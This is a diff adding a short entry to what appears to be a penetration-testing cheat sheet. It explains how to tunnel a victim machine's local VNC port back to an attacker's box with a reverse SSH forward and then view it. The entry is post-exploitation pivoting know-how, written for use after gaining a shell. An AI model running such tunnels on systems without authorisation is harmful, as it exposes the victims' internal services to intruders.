@@ -1033,3 +1033,14 @@ Find all files with world writeable permissions and ignore links.
 ```bash
 find . -perm -002 ! -type l -exec ls -l {} \;
 ```
+
+Port fowarding trick.  If you have a shell on a box and and need to foward something to
+localhost on the victim: On the victim maching ssh into your box using
+```bash
+ssh root@ipaddress -R 4444:localhost:5901
+```
+port 4444 will be open on your system now so
+```bash
+vncview 127.0.0.1:4444
+```
+will foward vncviewr to the localhost:5901 on the victim machine.
